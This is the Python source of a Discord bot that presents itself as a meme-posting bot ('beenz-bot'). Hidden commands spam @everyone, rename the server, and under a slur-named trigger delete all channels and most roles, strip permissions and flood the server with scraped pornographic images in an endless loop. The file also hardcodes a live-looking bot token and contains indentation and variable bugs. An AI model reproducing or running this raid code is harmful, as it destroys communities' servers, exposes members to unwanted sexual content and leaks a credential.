#       ===beenz-bot v1.1===
#   ===Copyright 2020 Pr0x1mas===

print("Loading beenzbot...")

import discord
import random
import os
import imagesearch
import io
import aiohttp

# ---Setup connection to bot---
TOKEN = "Njg0NDgxODk2ODIyMjEwNTYw.Xl6vhw.MuaT661dhcMP7fXRxH6anIOccFc"
client = discord.Client()


# ---Main command setup---
@client.event

async def on_message(message):
     if message.author == client.user: #prevent bot replying to itself
          return
     
      if message.content.lower() == "$help":
          await message.channel.send("```beenz-bot Version 1.1 \n \n Help \n \n $meme - send a meme from r/dankmemes \n \n $beans - sends a cursed bean image from r/beansinstrangeplaces```")
               
     #--Fake meme feature--
     if message.content.lower() == "$meme":
          memes = imagesearch.getImages("https://www.reddit.com/r/dankmemes/") #load dankmemes hot page

          anymemes = False

          for meme in memes:
               if meme.startswith("https://preview.redd.it"):
                    anymemes = True
                    break
               
          if anymemes == True:
               meme = random.choice(memes) #select random image from page
               while not meme.startswith("https://preview.redd.it"): #check it is an uploaded file and not an asset
                    meme = random.choice(memes)

          
               async with aiohttp.ClientSession() as session: #http stuff I don't understand
                              async with session.get(meme) as resp:
                                   if resp.status != 200:
                                        return
                                   meme = meme + ".jpg"
                                   data = io.BytesIO(await resp.read())
                                   await message.channel.send(file=discord.File(data, os.path.basename(meme))) #send the meme
          else:
               await message.channel.send("`unable to locate a meme`")
               print(memes)
               
               #--Fake bean feature--
     if message.content.lower() == "$beans":
          beans = imagesearch.getImages("https://www.reddit.com/r/BeansInStrangePlaces/") #load dankmemes hot page

          anybeans = False

          for bean in beans:
               if bean.startswith("https://preview.redd.it"):
                    anybeans = True
                    break
               
          if anymemes == True:
               bean = random.choice(beans) #select random image from page
               while not bean.startswith("https://preview.redd.it"): #check it is an uploaded file and not an asset
                    bean = random.choice(beans)

          
               async with aiohttp.ClientSession() as session: #http stuff I don't understand
                              async with session.get(bean) as resp:
                                   if resp.status != 200:
                                        return
                                   bean = bean + ".jpg"
                                   data = io.BytesIO(await resp.read())
                                   await message.channel.send(file=discord.File(data, os.path.basename(bean))) #send the meme
          else:
               await message.channel.send("`unable to locate a meme`")
               print(memes)

     # --Spam server with propaganda--
     if message.content.lower() == "$propaganda":
          for i in range(15):
               await message.channel.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
               await message.channel.send(file=discord.File('assets/flag.png'))
               await message.channel.send("Join us: https://discord.gg/arvVft4")

     # --Claim the server as a colony of Heinz--
     if message.content.lower() == "$colony":
          await message.guild.edit(name="Colony of Heinz") #change server name

          with open(os.path.join(os.path.dirname(__file__), "assets/flag.png"), 'rb') as f:
               await message.guild.edit(icon=f.read()) #change server icon

     # --Destroy the server--
     if message.content.lower() == "$rape":

          #-delete all channels-
          channels = []
          for channel in message.guild.channels: #get all channels
                    channels.append(channel)

          for channel in channels:
               await channel.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")

          #-make new channel-
          channel = await message.guild.create_text_channel('HEINZ')
          heinz = client.get_channel(message.guild.channels[0].id)
          await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")

          #-delete all roles-
          roles = []
          try:
               for role in message.guild.roles: #get all roles
                    roles.append(role)
                    
               for role in roles[2:]:
                    await role.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
          except Exception:
               await heinz.send("`error deleting roles`")

          #-remove all perms-

          perms = discord.Permissions() #create new empty permissions object
          perms.update(read_messages = True) #make it so user can see messages
               
          for role in roles:
               if role.name == "@everyone": #get only @everyone role
                    await role.edit(permissions=perms) #apply new permissions

          #-spam images-
          

          hentai = imagesearch.getImages("https://hentaihaven.xxx") #load hentai from hentaihaven (kill me now)
          
          
          try:
               while True: #repeat 1000
                    y = random.choice(hentai) #get random bit of hentai
                    while not y.startswith("https://hentaihaven.xxx/www/"): #check it is a video preview and not an asset
                         y = random.choice(hentai)
                    async with aiohttp.ClientSession() as session: #http stuff I don't understand
                         async with session.get(y) as resp:
                              if resp.status != 200:
                                   return await channel.send('`error loading image`')
                              data = io.BytesIO(await resp.read())
                              await channel.send(file=discord.File(data, os.path.basename(y))) #send hentai
          except Exception:
               print("Kicked from server")
         
     
@client.event
async def on_ready():
     print('------')
     print('Logged in as')
     print(client.user.name)
     print(client.user.id)
     print('------')


client.run(TOKEN)

